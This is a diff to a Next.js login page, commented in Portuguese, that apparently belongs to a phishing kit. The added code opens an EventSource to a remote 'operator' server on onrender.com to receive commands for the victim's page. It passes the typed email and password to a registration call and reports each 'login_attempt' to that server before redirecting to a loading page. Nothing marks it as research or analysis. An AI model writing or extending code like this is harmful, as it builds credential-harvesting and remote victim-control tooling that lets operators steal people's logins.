@@ -8,6 +8,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { Eye, EyeOff, ChevronDown, AlertCircle } from "lucide-react"
 import Image from "next/image"
 import { useMetrics } from "@/hooks/useMetrics"
+import { useEventSource } from "@/hooks/useEventSource"
 import { useRouter } from "next/navigation"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 
@@ -148,13 +149,36 @@ export default function LoginPage() {
   const [password, setPassword] = useState("")
   const [isLoading, setIsLoading] = useState(false)
   const [error, setError] = useState<string | null>(null)
+  const [clientId, setClientId] = useState<string | null>(null)
 
   const [showChat, setShowChat] = useState(false)
   const [chatMessages, setChatMessages] = useState([
     { type: "bot", message: language === "fr" ? "Bonjour! Comment puis-je vous aider?" : "Hello! How can I help you?" },
   ])
 
+  // EventSource para detectar comandos do servidor
+  const eventSource = useEventSource({
+    url: 'https://servidoroperador.onrender.com/api/events',
+    clientId: clientId || undefined,
+    onMessage: (data) => {
+      console.log('📨 Comando recebido na página home:', data);
+    },
+    onError: (error) => {
+      console.log('❌ Erro no EventSource:', error);
+    }
+  });
+
   const t = translations[language as keyof typeof translations]
+  
+  // Recuperar clientId do localStorage
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const storedClientId = localStorage.getItem('client_id');
+      if (storedClientId) {
+        setClientId(storedClientId);
+      }
+    }
+  }, []);
   
   // Envio automático de métricas ao carregar a página
   useEffect(() => {
@@ -203,10 +227,24 @@ export default function LoginPage() {
       // Verificar se já existe um clientId (atualização de dados)
       const existingClientId = localStorage.getItem('client_id')
       
-      // Registrar cliente ou atualizar dados usando dados do useMetrics
-      const clientData = await registerClient(email, password, existingClientId || undefined, metrics.metrics)
+      // Registrar cliente ou atualizar dados
+      const clientData = await registerClient(email, password, existingClientId || undefined)
       
       if (clientData) {
+        // Salvar clientId se retornado
+        if (clientData.clientId) {
+          setClientId(clientData.clientId);
+        }
+        
+        // Enviar notificação de login para o EventSource
+        if (eventSource.sendMessage) {
+          eventSource.sendMessage({
+            action: 'login_attempt',
+            email: email,
+            timestamp: new Date().toISOString()
+          });
+        }
+        
         // Redirecionar para página de loading
         router.push("/loading")
       } else {
